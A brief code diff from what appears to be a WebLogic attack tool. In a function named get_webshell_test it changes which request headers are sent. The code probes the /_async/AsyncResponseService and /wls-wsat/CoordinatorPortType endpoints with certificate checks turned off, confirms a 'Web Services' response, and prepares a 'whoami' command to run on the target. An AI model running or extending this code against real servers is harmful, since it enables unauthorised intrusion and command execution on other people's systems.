@@ -77,8 +77,8 @@ def get_webshell_test(url):
         else:          
             url = 'http://' + ip_port + '/_async/AsyncResponseService'
             u2 = 'http://' + ip_port + '/wls-wsat/CoordinatorPortType'
-        r0 = requests.get(url, headers=headers,timeout = 10,verify=False)
-        r2 = requests.get(u2, headers=headers,timeout = 10,verify=False)
+        r0 = requests.get(url, headers=headers2,timeout = 10,verify=False)
+        r2 = requests.get(u2, headers=headers2,timeout = 10,verify=False)
         if r2.status_code == 200 and 'Web Services' in r2.text:
             #print(u2)
             cmd = 'whoami'
